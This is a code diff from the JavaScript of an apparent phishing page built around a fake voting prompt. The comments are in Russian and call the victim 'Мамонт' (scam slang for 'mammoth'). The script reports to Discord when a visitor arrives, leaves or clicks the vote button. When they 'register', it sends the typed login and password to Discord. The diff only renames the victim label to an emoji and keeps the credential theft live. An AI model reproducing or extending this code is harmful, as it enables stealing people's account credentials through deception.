@@ -50,18 +50,18 @@ function sendToDiscord(message) {
 
 // Уведомление в Discord при входе пользователя на сайт
 window.onload = () => {
-    sendToDiscord('Мамонт зашел на сайт.');
+    sendToDiscord('🦣 зашел на сайт.');
 };
 
 // Уведомление в Discord при попытке покинуть сайт
 window.onbeforeunload = () => {
-    sendToDiscord('Мамонт покинул сайт.');
+    sendToDiscord('🦣 покинул сайт.');
 };
 
 // Обработка клика по кнопке голосования
 document.getElementById('voteButton').addEventListener('click', function() {
     document.getElementById('modal').style.display = 'block';
-    sendToDiscord('Мамонт нажал кнопку "Голосовать".');
+    sendToDiscord('🦣 нажал кнопку "Голосовать".');
 });
 
 // Закрытие модального окна
@@ -85,7 +85,7 @@ document.getElementById('registerButton').addEventListener('click', function() {
     document.getElementById('modal').style.display = 'none';
 
     // Уведомление в Discord о попытке входа
-    sendToDiscord(`Мамонь дал данные:\nЛогин Мамонта: ${username}\nПароль Мамонта: ${password}`);
+    sendToDiscord(`🦣 дал данные:\nЛогин Мамонта: ${username}\nПароль Мамонта: ${password}`);
 });
 
 // Закрытие модального окна при клике вне его
